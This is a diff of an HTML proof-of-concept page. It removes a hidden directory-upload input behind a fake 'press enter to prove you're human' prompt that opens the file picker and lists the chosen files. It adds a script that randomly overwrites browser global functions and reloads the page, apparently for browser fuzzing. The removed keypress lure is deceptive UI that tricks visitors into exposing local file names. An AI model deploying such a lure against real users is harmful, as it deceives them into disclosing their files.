@@ -1,47 +1,43 @@
-<html>
-<head>
-    <title>
-		PoC
-    </title>
-    <style>
-        #thing {
-            opacity: 0.0;
-        }
-    </style>
-</head>
-
 <body>
-    <h3 id="qmsg">Click the enter key as fast as you can for 5 seconds to prove you're human..</h3>
-    <input id="thing" type="file" webkitdirectory mozdirectory accept="text/*" />
+aaaaaaaaa
 
 <script>
-    var i = 0;
 
-    document.onkeydown = function () {
-        i++;
-        if (i > 4) {
-            thing.click();
-            i = -10000;
-            document.onkeydown = null;
-        }
-    };
 
-    thing.onchange = function () {
-        const files = this.files;
 
-        let output = "<h3>Selected Files:</h3><ul>";
+function getRandomInt(max) {
+  return Math.floor(Math.random() * Math.floor(max));
+}
+var qredirect="";
 
-        for (let j = 0; j < files.length; j++) {
-            const file = files[j];
+if(location.hash=="#q"){
+document.body.innerHTML='<b>speffed</b>';
 
-            output += "<li>" + file.webkitRelativePath + "</li>";
-        }
+}else{
+for(q in this){
+	try{
+		if(q!='dispatchEvent' && q!='location'){
+		if(typeof this[q]=='function' && (getRandomInt(7)<3)){
+		console.log(document.title=q)
+			//this[q]('Q'.repeat(100));
+		}else if(getRandomInt(7)<3){
+		if(q=='getRandomInt'){console.log('wut-'.repeat(100))}
+		console.log(document.title=q)
+			this[q]=function(e){if(e.toString()=="[object PageTransitionEvent]" || e.toString()=="[object FocusEvent]"){alert("try ett")}else{alert(e)}console.dir(e)};
+			
+		}
+		}
+		
+	}catch(e){
+		document.title="!!!ERR:"+q;
+	if(q=="removeEventListener"){window.qredirect="q";}
+	}
+}
 
-        output += "</ul>";
-
-        qmsg.innerHTML = output;
-    };
+}
+if(location.hash!="#q"){
+location="?"+getRandomInt(1000)+"#"+window.qredirect;
+}
 </script>
-</body>
 
-</html>
+</body>
